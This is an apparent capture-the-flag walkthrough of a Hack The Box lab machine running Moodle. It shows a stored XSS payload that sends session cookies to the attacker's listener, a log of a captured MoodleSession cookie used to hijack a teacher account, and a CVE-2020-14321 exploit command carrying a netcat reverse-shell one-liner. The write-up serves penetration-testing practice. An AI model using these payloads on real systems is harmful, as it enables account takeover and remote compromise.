* Make a user account on the moodle site
* Looking around, see that out of all the classes you can only enroll in math
* Once enrolled, look at the announcements
* Find something interesting in the "Reminder for joining students" announcement
![[Pasted image 20210624184949.png]]
* He says that he'll be checking the moodlenet profiles, which is a setting we can edit
* Think this is XSS vector
* Start up special webserver on our box that logs all cookies of requests
* Inject some code to point them to our web server:

```php
<script>var i=new Image;i.src="http://10.10.14.18:8888/?"+document.cookie;</script>
```
* Get a call back with the desired cookie

```php
hunter@kali ~/htb/schooled/www$ python server.py
Started http server
2021-06-24 06:45 PM - 10.10.10.234      Mozilla/5.0 (X11; FreeBSD amd64; rv:86.0) Gecko/20100101 Firefox/86.0 
-----------------------------------------------------------------------------------------------------------------
MoodleSession                   ['ctudap8f027jc4cin81gdg8uqb']
```
* Go into firefox and set our cookie as this one we just got using the developer tools
![[Pasted image 20210624190411.png]]
* We are now signed in as user Manuel Phillips
* Doing some enumeration, we find that the moodle version is v3.9
* Go to the moodle release page where they detail security fixes, find a cve for our version
	* https://github.com/lanzt/CVE-2020-14321
* This exploit gives rce as long as you have a teacher account, which we do

```bash
hunter@kali ~/htb/schooled/src$ ./exploit.py 'http://moodle.schooled.htb/moodle' --cookie 'nhfpc0n8a244gpjfvplef3vslv' --cdomain 'moodle.schooled.htb' --cpath '/moodle/' -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.18 9001 >/tmp/f'
```

![[Pasted image 20210625152038.png]]
* Use the rce to get a reverse shell as user www